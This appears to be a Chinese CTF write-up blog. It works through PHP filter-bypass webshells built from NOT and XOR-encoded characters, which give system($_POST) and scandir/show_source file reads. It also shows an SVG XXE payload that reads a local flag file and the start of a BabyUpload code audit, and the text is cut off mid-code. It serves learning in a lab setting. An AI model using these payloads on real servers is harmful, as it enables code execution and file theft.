<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之。”&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;mb_strlen(<span class="variable">$str</span>, <span class="string">&#x27;utf-8&#x27;</span>); <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$st</span> = mb_substr(<span class="variable">$str</span>, <span class="variable">$i</span>,<span class="number">1</span>, <span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">    <span class="variable">$a</span> = ~(<span class="variable">$st</span>);</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$a</span>[<span class="number">1</span>];				<span class="comment">#取汉字的第一位</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])		<span class="comment">#$_GET[&#x27;a&#x27;]想要得到的字符</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$st</span>;<span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/?a=">http://localhost/?a=</a></p>
</blockquote>
<p>得到利用字母，按照P神文章里讲的拼接即可</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我们可以通过<span class="symbol">$</span>_=~(<span class="string">&#x27;北&#x27;</span>)[<span class="number">1</span>]构造，但是无奈的是数字被过滤了。所以，在构造<span class="built_in">exp</span>前。就要先构造出<span class="number">1</span></span><br><span class="line"><span class="symbol">$</span>_=[]；</span><br><span class="line"><span class="symbol">$</span>__=<span class="symbol">$</span>_==<span class="symbol">$</span>_；</span><br><span class="line">#<span class="symbol">$</span>__是一个判断<span class="symbol">$</span>_是否等于<span class="symbol">$</span>_。返回True即<span class="number">1</span></span><br><span class="line">然后我们就可以构造<span class="built_in">exp</span>了</span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line"><span class="variable">$__</span>=[];<span class="variable">$____</span>=<span class="variable">$__</span>==<span class="variable">$__</span>;</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line"><span class="variable">$_</span>=~(北)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(熙)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(北)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(拾)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(的)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(和)[<span class="variable">$____</span>];</span><br><span class="line"><span class="comment">#system</span></span><br><span class="line"><span class="variable">$___</span>=~(样)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(说)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(小)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(次)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(站)[<span class="variable">$____</span>];<span class="variable">$____</span>=~(瞰)[<span class="variable">$____</span>];</span><br><span class="line"><span class="comment">#_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$$___</span>[<span class="variable">$_</span>]);</span><br><span class="line"><span class="comment">#system($_POST[system]);</span></span><br></pre></td></tr></table></figure>
<p>得到文件目录，post传参 system=env</p>
<p>(env是环境变量，相当于phpinfo)</p>
<h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><p>知识点：无字母数字shell构造</p>
<p><strong>PHP在处理字符串时有个有趣的特性。</strong></p>
<p><strong>PHP默认会把没有加引号的字符串当成常量处理，找不到对应常量就会将其解释成字符串</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> abc;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu44.png"></p>
<p><strong>虽然抛出警告，但是还是打印出了abc，并且这个警告我们可以用”@”，去掉。</strong></p>
<p><strong>还有一点，PHP调用函数，可以使用字符串调用。</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">print_r(get_defined_functions());       <span class="comment">//正常输出该函数返回值</span></span><br><span class="line">print_r(<span class="string">&#x27;get_defined_functions()&#x27;</span>;      <span class="comment">//正常输出函数返回值</span></span><br><span class="line">print_r(<span class="string">&quot;get_defined_functions()&quot;</span>.<span class="string">&quot;\n&quot;</span>);    <span class="comment">//返回字符串&quot;get_defined_functions()&quot;</span></span><br><span class="line"><span class="variable">$b</span> = get_defined_functions();       </span><br><span class="line">print_r (<span class="string">&quot;<span class="subst">$b</span>&quot;</span>);  <span class="comment">//返回array</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>通过脚本，匹配出 <code>print_r(scandir(&#39;.&#39;));</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$l</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$r</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$argv</span> = str_split(<span class="string">&quot;_GET&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;count(<span class="variable">$argv</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">255</span>;<span class="variable">$j</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$k</span> = chr(<span class="variable">$j</span>)^chr(<span class="number">255</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$k</span> == <span class="variable">$argv</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                <span class="variable">$l</span> .= <span class="string">&quot;%ff&quot;</span>;</span><br><span class="line">                <span class="variable">$r</span> .= <span class="string">&quot;%0&quot;</span> . dechex(<span class="variable">$j</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$l</span> .= <span class="string">&quot;%ff&quot;</span>;</span><br><span class="line">            <span class="variable">$r</span> .= <span class="string">&quot;%&quot;</span> . dechex(<span class="variable">$j</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\&#123;<span class="subst">$l</span>`<span class="subst">$r</span>\&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span></span><br></pre></td></tr></table></figure>
<p>但是题目还有一个条件，就是出现的不同字符数不能超过13，除了必要的（，），^ ,  ;  ，%ff我们最多再有8个字符</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//爆破</span><br><span class="line"><span class="comment">#https://g.yuque.com/u390550/hsy6gq/emyf3s?language=en-us</span></span><br><span class="line"></span><br><span class="line">result2 = [<span class="number">0x8b</span>, <span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x91</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8d</span>, <span class="number">0x8c</span>]  <span class="comment"># Original chars,11 total</span></span><br><span class="line">result = [<span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8c</span>]  <span class="comment"># to be deleted</span></span><br><span class="line">temp = []</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> result2:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> result:</span><br><span class="line">                <span class="keyword">if</span> (a ^ b ^ c == d):</span><br><span class="line">                    <span class="keyword">if</span> a == b == c == d:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        print(<span class="string">&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot;</span> % (a, b, c, d))</span><br><span class="line">                        <span class="keyword">if</span> d <span class="keyword">not</span> <span class="keyword">in</span> temp:</span><br><span class="line">                            temp.append(d)</span><br><span class="line">print(<span class="built_in">len</span>(temp), temp)</span><br></pre></td></tr></table></figure>
<p>整理得</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(.));==((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>
<p>Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; index.php [3] =&gt; n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt )</p>
<p>文件在scandir的结果最后面，那么用end()方法就可以得到文件名了。读文件可以用show_source或者readfile</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//和上面一样的方法，构造出payload</span></span><br><span class="line"></span><br><span class="line">Payload:show_source(end(scandir(.)));==((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br></pre></td></tr></table></figure>




<h2 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h2><p>知识点<strong>：XXE+SVG</strong></p>
<p>/proc/self/cwd  显示当前位置</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///proc/self/cwd/flag.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="HFCTF2020-BabyUpload"><a href="#HFCTF2020-BabyUpload" class="headerlink" title="[HFCTF2020]BabyUpload"></a>[HFCTF2020]BabyUpload</h2><p><strong>知识点：</strong></p>
<ol>
<li><strong>PHP 代码审计</strong></li>
<li><strong>session 处理器甄别 + session 伪造</strong></li>
<li><strong>函数特性（file_exists）</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代码审计</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">&quot;/var/babyctf/&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//开头，将 session 的放置目录设置为 /var/babyctf/，并且启动 session，同时引入 /flag 内容，高亮代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] ===<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="string">&#x27;/var/babyctf/success.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            safe_delete(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] =<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断 session 中 username 是否为 admin，是的话判断 /var/babyctf/success.txt 是否存在，存在的话就把 success.txt 删了，并显示 flag。如果username不为admin ,则为guest</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$direction</span> = filter_input(INPUT_POST, <span class="string">&#x27;direction&#x27;</span>);</span><br><span class="line"><span class="variable">$attr</span> = filter_input(INPUT_POST, <span class="string">&#x27;attr&#x27;</span>);</span><br><span class="line"><span class="variable">$dir_path</span> = <span class="string">&quot;/var/babyctf/&quot;</span>.<span class="variable">$attr</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$attr</span>===<span class="string">&quot;private&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$dir_path</span> .= <span class="string">&quot;/&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取相关参数，均为 POST 参数，direction 表示是上传(upload)还是下载(download)操作，attr 会被直接拼接在 /var/babyctf 这个路径后面，如果 attr 为 private 则把用户名继续拼接在后面。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$direction</span> === <span class="string">&quot;upload&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid upload&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file_path</span> = <span class="variable">$dir_path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_path</span> .= <span class="string">&quot;_&quot;</span>.hash_file(<span class="string">&quot;sha256&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, <span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir(<span class="variable">$dir_path</span>, <span class="number">0700</span>, <span class="literal">TRUE</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="variable">$upload_result</span> = <span class="string">&quot;uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$upload_result</span> = <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//上传操作，把上传文件的文件名拼接在 $dir_path （$dir_path= &quot;/var/babyctf/&quot;.$attr;）后面，同时加上下划线和这个文件内容的 sha256 摘要值，文件是我们上传的，文件内容知道的情况下这个值也是可以在本地算出来的。然后判断是否有路径穿越，逐级创建目录，将文件储存到下面上传就结束了    </span></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$direction</span> === <span class="string">&quot;download&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$filename</span> = basename(filter_input(INPUT_POST, <span class="string">&#x27;filename&#x27;</span>));</span><br><span class="line">        <span class="variable">$file_path</span> = <span class="variable">$dir_path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, <span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(<span class="variable">$file_path</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;file not exist&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        header(<span class="string">&#x27;Content-Type: application/force-download&#x27;</span>);</span><br><span class="line">        header(<span class="string">&#x27;Content-Length: &#x27;</span>.filesize(<span class="variable">$file_path</span>));</span><br><span class="line">        header(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.substr(<span class="variable">$filename</span>, <span class="number">0</span>, <span 